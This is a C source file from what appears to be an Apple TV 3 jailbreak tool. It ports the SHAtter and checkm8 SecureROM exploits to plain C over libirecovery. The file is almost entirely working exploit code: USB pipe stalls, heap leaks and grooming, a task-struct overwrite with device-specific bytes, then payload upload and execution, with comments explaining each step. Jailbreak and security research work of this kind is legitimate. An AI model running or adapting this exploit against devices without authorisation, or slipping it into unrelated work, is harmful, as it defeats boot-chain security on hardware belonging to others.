//
//  Checkm8Pwn.c
//  blackb0x-pwn
//
//  SHAtter/checkm8 exploit bodies and their iRecovery USB helpers, ported
//  byte-for-byte from the original DeviceManager.m (git history --
//  `git show 907b64b^:Blackb0x/Source/DeviceManager.m`; deleted from the
//  tree in 907b64b, "Remove leftover original Objective-C/Cocoa source").
//  This is exploit-critical hardware-timing code and is not "improved"
//  during conversion, only translated from Objective-C method syntax to
//  plain C -- same rule DeviceManager.cpp's own SHAtter() port already
//  follows, see that file's comment. checkm8() here is a *fresh* port of
//  that same original: DeviceManager.cpp's own checkm8() was replaced
//  with a shell-out to the vendored `gaster` tool before this file
//  existed (see docs/HISTORY.md) and never carried the original body
//  forward, so it's recovered from git history here rather than copied
//  from DeviceManager.cpp.
//
//  The one deliberate deviation from the original: status/progress used
//  to update AppKit widgets via dispatch_async(dispatch_get_main_queue(),
//  ...) -- there's no GUI here, so those become plain printf()s, exactly
//  the same substitution DeviceManager.cpp's own SHAtter() port already
//  made for its sink_.onStatus/onProgress callbacks.

#include "Checkm8Pwn.h"

// checkm8.h uses size_t without including <stddef.h> itself (the original
// relied on an earlier #import <Cocoa/Cocoa.h> providing it transitively)
// -- must come before checkm8.h/SHAtter.h below.
#include <stddef.h>

#include "checkm8.h"
#include "SHAtter.h"

#include <libirecovery.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

// Ported from the original DeviceManager.h (git history) -- checkm8()'s
// own per-device exploit parameters, not payload data (that's
// checkm8.h's own checkm8_payload_8947[]).
typedef struct checkm8_config {
    uint16_t large_leak;
    uint16_t hole;
    int overwrite_offset;
    uint16_t leak;
    unsigned char* overwrite;
    size_t overwrite_len;
    unsigned char* payload;
    size_t payload_len;
} checkm8_config_t;

// S5L8947X (Apple TV 3,1/3,2) task-struct overwrite bytes -- same constant
// as the original DeviceManager.h's S518947X_OVERWRITE.
static unsigned char S518947X_OVERWRITE[] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34,
    0x00, 0x00, 0x00, 0x00,
};

static void reset_counters(irecv_client_t client) {
    int ret = irecv_reset_counters(client);
    printf("-- Reset usb counters. (%i)\n", ret);
    if (ret < 0) {
        printf("-- Failed to reset usb counters.\n");
    }
}

static void usb_reset(irecv_client_t client) {
    int ret = irecv_reset(client);
    printf("-- Reset DFU. (%i)\n", ret);
    if (ret < 0) {
        printf("Failed to reset DFU.\n");
    }
}

static void send_buffer(irecv_client_t client, unsigned char* data, unsigned long size) {
    irecv_error_t error = irecv_send_buffer(client, data, size, 0);
    printf("send buffer: %i\n", error);
}

static void get_data(irecv_client_t client, char* buffer, unsigned long length) {
    irecv_error_t error = irecv_recv_buffer(client, buffer, length);
    printf("get_data: %i\n", error);
}

static void request_image_validation(irecv_client_t client) {
    int ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, NULL, 0, 1000);
    if (ret != 0) {
        printf("Failed to request image validation\n");
    }

    unsigned char blank[16];
    memset(blank, 0, 16);

    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
    usb_reset(client);
}

static int msleep(long msec) {
    struct timespec ts;
    int res;

    if (msec < 0) {
        errno = EINVAL;
        return -1;
    }

    ts.tv_sec = msec / 1000;
    ts.tv_nsec = (msec % 1000) * 1000000;

    do {
        res = nanosleep(&ts, &ts);
    } while (res && errno == EINTR);

    return res;
}

static int usb_req_stall(irecv_client_t client) {
    return irecv_usb_control_transfer(client, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
}

static int usb_req_leak(irecv_client_t client) {
    unsigned char buf[0x40];
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
}

static int usb_req_no_leak(irecv_client_t client) {
    unsigned char buf[0x41];
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
}

// checkm8 deliberately induces a pipe stall as its first exploit step, and
// relies on a transfer timeout for every heap leak after that -- these are
// the sequence's success signals, not errors.
//
// irecv_usb_control_transfer() does not normalise its return value across
// libirecovery's two backends. On IOKit it runs through
// iokit_usb_control_transfer(), which translates IOKit status into
// libirecovery's own enum (kIOUSBPipeStalled -> IRECV_E_PIPE == -10,
// kIOReturnTimeout/kIOUSBTransactionTimeout -> IRECV_E_TIMEOUT == -11). On
// libusb it is a bare pass-through returning libusb's raw codes from a
// completely unrelated enum (LIBUSB_ERROR_PIPE == -9, LIBUSB_ERROR_TIMEOUT
// == -7). Checking only the IRECV_E_* spelling makes a working exploit look
// like an instant hard failure on Linux ("Failed to stall pipe -9.").
//
// docs/HISTORY.md records this exact gap being found and fixed once already,
// in the DeviceManager.cpp checkm8() that predates this file. It came back
// here because this file was recovered from the original Objective-C, which
// only ever ran against IOKit.
//
// Accepting both spellings rather than selecting one per platform is safe,
// not lazy: iokit_usb_control_transfer()'s translation table can only ever
// return wLenDone, IRECV_E_PIPE, IRECV_E_TIMEOUT, IRECV_E_NO_DEVICE or
// IRECV_E_UNKNOWN_ERROR, so -9 and -7 are values it cannot produce at all
// and there is nothing for them to be confused with there. Spelled
// numerically because <libusb.h> is not on this target's include path on
// Apple, where it links no libusb at all.
#define LIBUSB_RET_PIPE (-9)
#define LIBUSB_RET_TIMEOUT (-7)

static int isPipeStall(int ret) {
    return ret == IRECV_E_PIPE || ret == LIBUSB_RET_PIPE;
}

static int isTransferTimeout(int ret) {
    return ret == IRECV_E_TIMEOUT || ret == LIBUSB_RET_TIMEOUT;
}

static int get_payload_configuration(uint16_t cpid, const char* identifier, checkm8_config_t* config) {
    (void)identifier;

    switch (cpid) {
        case 0x8947:
            config->payload = malloc(checkm8_payload_length_armv7);
            config->payload_len = checkm8_payload_length_armv7;
            memcpy(config->payload, checkm8_payload_8947, checkm8_payload_length_armv7);
            break;

        default:
            printf("No payload offsets are available for your device.\n");
            return -1;
    }

    return 0;
}

static int get_exploit_configuration(uint16_t cpid, checkm8_config_t* config) {
    switch (cpid) {
        case 0x8947:
            printf("0x8947 configuration\n");
            config->large_leak = 626;
            config->hole = 0;
            config->overwrite_offset = 0x660;
            config->leak = 0;
            config->overwrite = S518947X_OVERWRITE;
            config->overwrite_len = sizeof(S518947X_OVERWRITE);
            return 0;

        default:
            printf("No exploit configuration is available for your device.\n");
            return -1;
    }
}

// ecid == 0 opens the first DFU-mode device irecv_open_with_ecid() finds --
// matches how the rest of this tool (and gaster itself) work: one device
// connected at a time, no menu. Patient (30 one-second retries, not
// get_tv's usual handful): checkm8() in particular needs to reconnect to a
// device that's actively re-initializing its own USB stack after a bus
// reset or after running injected SecureROM-level code, which can take
// meaningfully longer than a short default -- see DeviceManager.cpp's own
// get_tv_patient() comment for the same reasoning applied to the gaster
// path.
static irecv_client_t get_tv(uint64_t ecid) {
    irecv_client_t client = NULL;

    for (int i = 0; i < 30; i++) {
        irecv_error_t err = irecv_open_with_ecid(&client, ecid);
        if (err == IRECV_E_SUCCESS) {
            return client;
        }
        if (err == IRECV_E_UNSUPPORTED) {
            fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
            return NULL;
        }
        if (i > 0) {
            fprintf(stderr, "  (reconnect attempt %d/30: %s, retrying...)\n", i + 1, irecv_strerror(err));
        }
        sleep(1);
    }
    return NULL;
}

int runSHAtter(uint64_t ecid) {
    irecv_client_t client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "SHAtter: no DFU-mode device found.\n");
        return 0;
    }

    // Idempotent: a device already showing "SHAtter" in its serial string
    // (the original device_event()'s own marker for an already-exploited
    // device -- see this file's own header comment) isn't in the clean
    // SecureROM DFU state the sequence below assumes. Re-running a
    // buffer-overflow exploit against a device already running injected
    // payload code is at best pointless, at worst liable to corrupt that
    // state -- check first and short-circuit, same as runCheckm8() below.
    {
        const struct irecv_device_info* info = irecv_get_device_info(client);
        int alreadyPwned = info && strstr(info->serial_string, "SHAtter") != NULL;
        irecv_close(client);
        if (alreadyPwned) {
            puts("Device already SHAtter'd");
            puts("SHAtter successful");
            return 1;
        }
    }

    client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "SHAtter: device disappeared after idempotency check.\n");
        return 0;
    }

    puts("Preparing buffer overflow");

    char data_one[0x40];
    memset(data_one, 0, sizeof(data_one));
    reset_counters(client);
    get_data(client, data_one, sizeof(data_one));

    usb_reset(client);
    irecv_close(client);

    puts("Requesting validation");

    client = get_tv(ecid);
    request_image_validation(client);
    irecv_close(client);

    puts("Filling buffer with zeros");
    char data_two[0x2C000];
    memset(data_two, 0, sizeof(data_two));

    client = get_tv(ecid);
    get_data(client, data_two, sizeof(data_two));
    irecv_close(client);

    msleep(500);

    puts("Overwriting SHA1 registers");
    char data_three[0x140];
    memset(data_three, 0, sizeof(data_three));

    client = get_tv(ecid);
    reset_counters(client);
    get_data(client, data_three, sizeof(data_three));
    usb_reset(client);
    irecv_close(client);

    client = get_tv(ecid);
    request_image_validation(client);
    irecv_close(client);

    puts("Sending SHAtter payload");
    char data_four[0x2C000];
    memset(data_four, 0, sizeof(data_four));

    client = get_tv(ecid);
    send_buffer(client, SHAtter_payload, 0x800);
    puts("Overwriting exception vectors");

    get_data(client, data_four, sizeof(data_four));
    irecv_close(client);

    msleep(500);

    puts("SHAtter successful");
    return 1;
}

int runCheckm8(uint64_t ecid) {
    irecv_client_t client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "checkm8: no DFU-mode device found.\n");
        return 0;
    }

    // Idempotent: a device already reporting "PWND:[" (same marker
    // checkm8()'s own end-of-exploit verification below checks, and the
    // same one DeviceManager.cpp's checkm8Attempt() already short-circuits
    // on) isn't in the clean SecureROM DFU state the exploit sequence
    // assumes -- e.g. a previous run already succeeded, or succeeded but
    // was killed before reporting it. Re-running this exploit against an
    // already-pwned device is at best pointless, at worst liable to
    // corrupt that state; check first rather than let a stale PWND:[ from
    // *before* this run make an unrelated failure look like success.
    {
        const struct irecv_device_info* info = irecv_get_device_info(client);
        int alreadyPwned = info && strstr(info->serial_string, "PWND:[") != NULL;
        irecv_close(client);
        if (alreadyPwned) {
            puts("Device already in pwned DFU");
            puts("Checkm8 successful");
            return 1;
        }
    }

    client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "checkm8: device disappeared after idempotency check.\n");
        return 0;
    }

    unsigned char buf[0x800];
    memset(buf, 'A', sizeof(buf));

    checkm8_config_t config;
    memset(&config, 0, sizeof(config));

    const struct irecv_device_info* info = irecv_get_device_info(client);
    irecv_device_t device_info = NULL;
    irecv_devices_get_device_by_client(client, &device_info);

    puts("Configuring checkm8 exploit");

    int ret = get_exploit_configuration((uint16_t)info->cpid, &config);
    if (ret != 0) {
        printf("Failed to get exploit configuration.\n");
        irecv_close(client);
        return 0;
    }

    ret = get_payload_configuration((uint16_t)info->cpid, device_info ? device_info->product_type : NULL, &config);
    if (ret != 0) {
        printf("Failed to get payload configuration.\n");
        irecv_close(client);
        return 0;
    }

    puts("Exploiting with checkm8");

    ret = usb_req_stall(client);
    if (!isPipeStall(ret)) {
        printf("Failed to stall pipe %i.\n", ret);
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    usleep(100);

    for (int i = 0; i < config.large_leak; i++) {
        ret = usb_req_leak(client);
        if (!isTransferTimeout(ret)) {
            printf("Failed to create heap hole.\n");
            free(config.payload);
            irecv_close(client);
            return 0;
        }
    }

    ret = usb_req_no_leak(client);
    if (!isTransferTimeout(ret)) {
        printf("Failed to create heap hole.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    irecv_reset(client);
    irecv_close(client);
    client = NULL;
    usleep(100);

    client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "checkm8: device did not reappear before overwrite.\n");
        free(config.payload);
        return 0;
    }

    puts("Preparing for overwrite");

    int sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
    if (sent < 0) {
        printf("Failed to send bug setup.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }
    if (sent > config.overwrite_offset) {
        printf("Failed to abort bug setup.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    ret = irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, 0);
    if (ret != 0) {
        printf("Failed to send abort.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    irecv_close(client);
    client = NULL;
    usleep(500000);

    client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "checkm8: device did not reappear before heap grooming.\n");
        free(config.payload);
        return 0;
    }

    puts("Grooming heap");

    ret = usb_req_stall(client);
    if (!isPipeStall(ret)) {
        printf("Failed to stall pipe.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    usleep(100);

    ret = usb_req_leak(client);
    if (!isTransferTimeout(ret)) {
        printf("Failed to create heap hole.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    puts("Overwriting task struct");

    size_t overwrite_buf_len = (size_t)config.overwrite_offset + config.overwrite_len;
    unsigned char* overwrite_buf = calloc(1, overwrite_buf_len);
    if (!overwrite_buf) {
        printf("Out of memory.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }
    memcpy(overwrite_buf + config.overwrite_offset, config.overwrite, config.overwrite_len);

    irecv_usb_control_transfer(client, 0, 0, 0, 0, overwrite_buf, (uint16_t)overwrite_buf_len, 100);
    free(overwrite_buf);

    puts("Uploading payload");

    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, config.payload, (uint16_t)config.payload_len, 100);
    if (!isTransferTimeout(ret)) {
        printf("Failed to upload payload.\n");
        free(config.payload);
        irecv_close(client);
        return 0;
    }

    puts("Executing payload");

    irecv_reset(client);
    irecv_close(client);
    free(config.payload);
    client = NULL;
    usleep(500000);

    client = get_tv(ecid);
    if (!client) {
        fprintf(stderr, "checkm8: device did not reappear after payload execution.\n");
        return 0;
    }

    info = irecv_get_device_info(client);
    const char* pwnd_str = info ? strstr(info->serial_string, "PWND:[") : NULL;
    printf("serial string: %s\n", info ? info->serial_string : "(none)");

    irecv_close(client);

    if (!pwnd_str) {
        puts("Checkm8 unsuccessful");
        return 0;
    }

    puts("Checkm8 successful");
    return 1;
}
